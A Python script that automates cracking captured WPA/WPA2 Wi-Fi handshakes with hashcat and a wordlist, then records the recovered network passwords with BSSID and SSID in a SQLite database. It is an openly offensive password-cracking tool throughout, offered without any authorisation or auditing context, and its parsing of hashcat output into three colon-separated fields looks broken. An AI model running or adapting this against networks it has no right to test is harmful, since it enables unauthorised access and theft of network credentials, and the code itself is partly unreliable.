import os
import sqlite3
import subprocess
import logging

# Configure logging
logging.basicConfig(filename='wifi_bruteforce.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Database for storing results
db_file = "wifi_results.db"
conn = sqlite3.connect(db_file)
cursor = conn.cursor()

# Create results table if it doesn't exist
cursor.execute('''
CREATE TABLE IF NOT EXISTS results (
    id INTEGER PRIMARY KEY,
    bssid TEXT,
    ssid TEXT,
    password TEXT,
    status TEXT
)
''')
conn.commit()

def run_hashcat(pcapng_file, wordlist):
    """Run Hashcat on a captured handshake file."""
    output_file = pcapng_file.replace(".pcapng", ".out")
    
    command = [
        "hashcat",
        "-m", "22000",  # WPA/WPA2 mode
        pcapng_file,
        wordlist,
        "-o", output_file
    ]
    
    try:
        logging.info(f"Running Hashcat on {pcapng_file}...")
        subprocess.run(command, check=True)
        logging.info(f"Hashcat completed. Results saved to {output_file}.")
        return output_file
    except subprocess.CalledProcessError as e:
        logging.error(f"Hashcat failed: {e}")
        return None

def log_result(bssid, ssid, password, status):
    """Log results to the SQLite database."""
    cursor.execute('''
    INSERT INTO results (bssid, ssid, password, status)
    VALUES (?, ?, ?, ?)
    ''', (bssid, ssid, password, status))
    conn.commit()

if __name__ == "__main__":
    pcapng_dir = "/path/to/pcapng/files"  # Replace with your directory
    wordlist = "/path/to/wordlist.txt"    # Replace with your wordlist
    
    for file in os.listdir(pcapng_dir):
        if file.endswith(".pcapng"):
            result_file = run_hashcat(os.path.join(pcapng_dir, file), wordlist)
            if result_file:
                with open(result_file, "r") as f:
                    for line in f:
                        bssid, ssid, password = line.strip().split(":")
                        log_result(bssid, ssid, password, "SUCCESS")
            else:
                log_result("UNKNOWN", "UNKNOWN", "UNKNOWN", "FAILED")
    
    conn.close()